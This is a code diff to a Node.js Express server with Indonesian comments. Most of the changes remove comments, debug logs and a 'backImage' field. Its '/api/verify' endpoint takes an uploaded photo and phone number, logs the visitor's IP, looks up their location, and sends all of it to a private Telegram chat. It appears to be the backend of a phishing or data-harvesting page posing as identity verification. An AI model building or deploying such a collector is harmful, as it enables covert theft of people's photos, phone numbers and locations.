@@ -18,7 +18,7 @@ console.log(`📱 CHAT_ID: ${CHAT_ID ? '✅ SET' : '❌ NOT SET'}`);
 console.log(`🌐 PORT: ${PORT}`);
 console.log('========================================');
 
-// Middleware - penting untuk handle raw body
+// Middleware
 app.use(express.json({ limit: '50mb' }));
 app.use(express.urlencoded({ extended: true, limit: '50mb' }));
 app.use(express.static('public'));
@@ -65,15 +65,12 @@ app.post('/api/verify', async (req, res) => {
   console.log('========================================');
   
   try {
-    // Ambil data dari body
-    const { image, phone, backImage } = req.body;
+    const { image, phone } = req.body;
     
     console.log(`📱 Phone: ${phone || 'Not provided'}`);
     console.log(`📸 Image exists: ${image ? 'YES' : 'NO'}`);
     console.log(`📸 Image length: ${image ? image.length : 0}`);
-    console.log(`📸 Back image: ${backImage ? 'YES' : 'NO'}`);
     
-    // Cek apakah ada image
     if (!image) {
       console.log('❌ No image received');
       return res.status(400).json({ 
@@ -82,16 +79,13 @@ app.post('/api/verify', async (req, res) => {
       });
     }
     
-    // Extract base64
     const base64Data = image.replace(/^data:image\/\w+;base64,/, '');
     const buffer = Buffer.from(base64Data, 'base64');
     console.log(`📸 Image size: ${buffer.length} bytes`);
     
-    // Get IP
     const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';
     console.log(`🌐 IP: ${ip}`);
     
-    // Get location
     let location = 'Tidak diketahui';
     try {
       const cleanIp = ip === '::1' ? '' : ip.split(',')[0].trim();
@@ -112,8 +106,6 @@ app.post('/api/verify', async (req, res) => {
     
     // ===== SEND TO TELEGRAM =====
     console.log('📤 Sending to Telegram...');
-    console.log(`🤖 Bot Token: ${BOT_TOKEN.substring(0, 15)}...`);
-    console.log(`📱 Chat ID: ${CHAT_ID}`);
     
     const form = new FormData();
     form.append('chat_id', CHAT_ID);
@@ -170,7 +162,5 @@ app.get('/', (req, res) => {
 app.listen(PORT, '0.0.0.0', () => {
   console.log('========================================');
   console.log(`🚀 Server running on port ${PORT}`);
-  console.log(`📊 Test bot: https://your-app.railway.app/test-bot`);
-  console.log(`📊 Test send: https://your-app.railway.app/test-send`);
   console.log('========================================');
 });
